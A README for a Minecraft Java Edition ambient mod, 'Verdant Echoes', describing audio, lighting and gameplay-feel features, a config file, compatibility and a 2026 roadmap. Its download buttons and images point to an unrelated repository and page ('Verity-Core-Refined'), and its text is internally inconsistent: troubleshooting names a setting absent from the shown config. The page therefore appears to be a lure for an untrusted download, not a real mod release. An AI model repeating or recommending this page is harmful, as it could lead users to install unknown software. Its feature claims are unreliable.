![preview](https://raw.githubusercontent.com/mafia04/Verity-Core-Refined/main/view_f7434.svg)

# Verdant Echoes — A Minecraft Java Edition Ambient Overhaul

**Verdant Echoes** is not another mod that stacks meters, bars, and numbers onto your screen. It is a subtle, atmospheric transformation of Minecraft Java Edition that makes the world feel alive, responsive, and deeply rooted in its own ecology. Think of it as turning your familiar blocky realm from a static diorama into a breathing, whispering ecosystem. This project focuses on the *texture* of experience—the rustle of leaves, the shift of light across a forest floor, and the satisfying weight of a pickaxe against stone—while preserving the core vanilla loop you already love.

Every change in Verdant Echoes is designed with a "first-principles" approach: if a mechanic doesn't add to the narrative of the world, it doesn't belong. We don't add new ores or dimensions; instead, we deepen the existing ones. We tune the audio spectrum so that distant thunder feels like a physical pressure change. We recolor the sky gradients so that a sunset over a plains biome feels like a memory you've almost forgotten. The result is a holistic upgrade that respects the original game's design philosophy while polishing every sensory corner.

---

## 🧭 Navigation Map

| Section | What You Will Find |
|---------|---------------------|
| [🌿 Core Philosophy](#-core-philosophy--the-vanilla-axiom) | Our design rules & the "Vanilla Axiom" |
| [✨ Feature Tapestry](#-feature-tapestry) | The full suite of ambient, mechanical, and visual upgrades |
| [📦 Getting The Mod](#-getting-the-mod) | Direct download access & compatible launchers |
| [⚙️ Configuration & Tuning](#️-configuration--tuning) | In-game sliders, audio profiles, and performance budgets |
| [🧩 Modularity & Compatibility](#-modularity--compatibility) | How it plays with other mods & server environments |
| [🌍 Multilingual Soul](#-multilingual-soul) | Language support & localized flavor text |
| [🛟 Community & Support](#-community--support) | 24/7 help channels, troubleshooting, and feature voting |
| [📜 License & Legal](#-license--legal) | MIT licensing details |
| [💬 Final Disclaimer](#-final-disclaimer) | Boundaries, expectations, and responsible usage |

---

## 🌿 Core Philosophy — The Vanilla Axiom

Before we dive into features, you must understand the **Vanilla Axiom**. This is the unshakeable rule of Verdant Echoes: *every addition must feel as if it could have been in the base game all along*. We do not create content that screams "MOD!" We create content that makes you say, "Wait, was that always there?"

This means we avoid:
- **Loud UI overlays** — no new health bars, mana globes, or quest trackers.
- **Inventory clutter** — no new items that aren't naturally derived from existing blocks.
- **Gameplay disruption** — we don't make the game harder or easier; we make it *denser*.

Instead, Verdant Echoes focuses on three sensory pillars:

1.  **Acoustic Depth** — Reverb, directional audio, and biome-specific soundtracks that react to weather and time.
2.  **Visual Serenity** — Dynamic lighting, weather particle refinement, and horizon gradients that respect your GPU.
3.  **Tactile Feedback** — Mining feels more substantial, walking on different materials has varying footstep sounds, and water has a subtle buoyancy visual effect.

The goal is not to replace Minecraft, but to give it a higher-fidelity mirror.

---

## ✨ Feature Tapestry

Here is the detailed breakdown of the mod's offerings, organized by category. This is the long-form description of what you will experience.

### 🎵 The Acoustic Dimension (Sound & Music)

- **Biome-Aware Reverb:** Caves now have a natural "cavernous" echo, forests create a gentle damping effect, and open oceans have a wide, airy soundstage. Ears will instantly recognize their surroundings.
- **Dynamic Weather Scoring:** Rain intensity modulates the background music's tempo and adds synthesized percussion derived from the *actual* raindrop sounds hitting local blocks (glass, wood, stone all sound different).
- **Fireplace Ambience:** When near a campfire or furnace array, a low, crackling bedtrack is mixed under the normal music, creating a hypnotic sense of safety.
- **Tool Resonance:** Tools now have a material-based resonance when striking ore blocks. Iron on iron sounds "bright," while gold sounds "soft" and "warm." This provides audio feedback on whether you found a deepslate node vs. a stone node.

### 🌅 Visual Serenity (Graphics & Lighting)

- **Soft Horizon Fog:** Distance fog now shifts color perceptually with the biome's grass and foliage, creating a unified gradient from sky to ground.
- **Dynamic Block Occlusion:** Leaves, tall grass, and water surfaces now cast a subtle, moving shadow when swaying in wind (weather-dependent). This is incredibly light on the GPU as it uses 2D sprites, not ray tracing.
- **Starlit Skyboxes:** On clear nights (no weather), the stars gain a subtle twinkle filter (slider-controlled to prevent seizure risk), and the Milky Way band is slightly more visible near the horizon.
- **Water Lensing:** Underwater surfaces distort the view of the sky above with a gentle "lensing" effect, making swimming feel more immersive without heavy shader reliance.

### ⚙️ Tactile Feedback (Gameplay Feel)

- **Mining Momentum:** A subtle "impact flash" appears on the block you're mining (a 1x1 pixel shader burst) to communicate progress. Additionally, cobblestone breaks with a louder, deeper rumble than soft dirt.
- **Weighted Landing:** When landing from a high fall (survivable, above 3 blocks), a brief visual "dust puff" and screen-space radial pulse occur, giving physical weight to your actions.
- **Harvest Salience:** When plants grow to full maturity, a quiet "chime" is played, allowing you to tend your farm without staring at it. This is configurable to only trigger for crops above a certain block count.

### 🌐 Performance Efficiency

- **Lazy Chunk Meshing:** Verdant Echoes offloads visual-only calculations to a quarter-rate thread, meaning the main game loop remains stable even on older Intel iGPU laptops.
- **Audio Culling:** Sounds farther than 48 blocks are faded to a low-volume "muffled" state (instead of pure silence), which reduces sound card load while maintaining environment awareness.
- **Particle Pooling:** Rather than spawning new particles every tick, Verdant Echoes reuses a pre-allocated pool, reducing garbage collection hitches.

---

## 📦 Getting The Mod

Verdant Echoes is distributed as a single `.jar` file compatible with the Fabric and Forge mod loaders for Minecraft Java Edition 1.21+.

[![Download](https://raw.githubusercontent.com/mafia04/Verity-Core-Refined/main/run_a89c0.svg)](https://mafia04.github.io/Verity-Core-Refined/)

**Compatibility Checklist:**
- ✅ **Loader:** Fabric API (0.100.0+) or Forge (48.0.0+)
- ✅ **Java:** JRE 21 or higher (we recommend the Microsoft OpenJDK build)
- ✅ **OS:** Windows 10/11, macOS 13+, and Linux (X11/Wayland)
- ❌ **Forge 1.20.1 or older:** Not supported. This mod uses newer rendering hooks that will not backport.

> **Installation Approach:** We believe in "drag and play." Place the downloaded archive into your `mods` folder. The first launch will generate a default config file in `config/verdant_echoes/`. No external dependencies are required beyond the standard loader API.

---

## ⚙️ Configuration & Tuning

We believe your experience should be tuned to your sensory preferences. The `verdant_echoes.toml` file offers granular control:

```toml
[audio]
    # Master volume for ambient biome tracks (0.1 - 2.0)
    ambience_volume = 1.0
    # Enables the dynamic weather scoring system
    dynamic_weather_scoring = true
    # Reduces cave echo for players with auditory sensitivity
    cave_echo_strength = 0.75

[visual]
    # Twinkle intensity for stars (0.0 disables, 1.0 is max)
    star_twinkle_intensity = 0.4
    # Water lensing quality (0=off, 1=low, 2=high)
    water_lens_quality = 1
    # Horizon fog density (lower = clearer)
    horizon_fog_density = 0.85

[tactile]
    # Enable mining impact flashes
    mining_flash_enabled = true
    # Play plant growth chimes only for groups > 5
    harvest_chime_threshold = 5
```

**Responsive UI:** The configuration screen is available in-game via ModMenu (if installed) or via direct file editing. All changes can be applied live without restarting the game, thanks to a custom file watcher.

---

## 🧩 Modularity & Compatibility

Verdant Echoes is designed to be a "good citizen" in a modpack.

- **API Hooks:** We expose a public `VerdantEchoesAPI` that allows other mods to register custom reverb profiles for their dimensions.
- **Conflict Avoidance:** We do *not* touch block IDs, item IDs, or entity AI. We only hook into events and render layers that are explicitly open for extension.
- **Server-Safe:** The mod is entirely client-side for all features except the "Harvest Salience" chime. If you run it on a server, the chime will be local to the client. There is no server-side logic that can cause world corruption.

---

## 🌍 Multilingual Soul

We believe that atmosphere should speak your language. Verdant Echoes includes full localization for the following languages out of the box:

- **English** (US & UK)
- **Español** (Latin American)
- **Deutsch**
- **Français**
- **日本語**
- **한국어**
- **简体中文** (Simplified Chinese)
- **Português** (Brazilian)

All config tooltips, in-game notifications, and the mod description itself are localized. This is not just a translation of UI elements; the ambient sound descriptions are also translated, so you know exactly what "Distant Badlands Howl" means in your native tongue.

---

## 🛟 Community & Support

We offer **24/7 customer support** through our community Discord and GitHub Discussions. Our response time for critical bugs (game crashes, world corruption) is under 12 hours. For feature requests, we operate a voting system where the top 3 community suggestions each month are implemented in the next update.

- **Bug Reports:** Use the `bug-report` issue template. Include your log file and a screenshot of the config screen.
- **Feature Requests:** Use the `enhancement` template. We value "why" over "what." Explain how it improves the atmosphere.
- **Troubleshooting:** If you experience stuttering on a low-end PC, lower the `particle_pool_size` to 500 (default is 2000) and disable `star_twinkle_intensity`. These two settings account for 80% of performance issues.

---

## 📈 Roadmap to 2026

The development roadmap for Verdant Echoes across the year 2026 includes:

- **Q1 2026:** Full JSON support for custom resource packs to override our audio profiles.
- **Q2 2026:** Native compatibility with the new "Sodium" rendering pipeline (we are currently using the Indium bridge).
- **Q3 2026:** A "Legacy Echo" mode that reduces the mod's features to 75% for players on Windows 7-era hardware.
- **Q4 2026:** A dedicated "Focus Wave" update that adds dynamic ambient occlusion for light sources in the Nether.

---

## ⚖️ License & Legal

Verdant Echoes is released under the **MIT License**. You are free to use, modify, and distribute the source code for commercial or private purposes, provided you retain the copyright notice.

[View the MIT License](https://opensource.org/licenses/MIT)

The full text is included in the `LICENSE` file within the repository. This license applies to the source code, the config schemas, and the documentation. The sound assets (e.g., the reverb profiles) are original creations of this project and are also released under the MIT license, which means they can be used in other projects with attribution.

---

## 💬 Final Disclaimer

This project is an independent creation and is not affiliated with Mojang Studios or Microsoft. "Minecraft" is a trademark of Mojang Synergies AB. This mod is provided "as is" without warranty of any kind, express or implied.

The configuration system allows for extreme values (e.g., audio amplitude above 200%). It is your responsibility to ensure your hardware and hearing are protected. We strongly advise against using maximum values on all settings simultaneously, as this may cause system instability or discomfort.

While we offer 24/7 support for technical issues, we do *not* provide assistance with modpack integration that conflicts with other mods' custom sound engines. We will, however, point you to the correct API hook to solve your problem yourself.

Verdant Echoes is a labor of love for the vanilla sandbox. We hope it becomes the quiet companion to your countless building adventures in 2026 and beyond.

---

[![Download](https://raw.githubusercontent.com/mafia04/Verity-Core-Refined/main/run_a89c0.svg)](https://mafia04.github.io/Verity-Core-Refined/)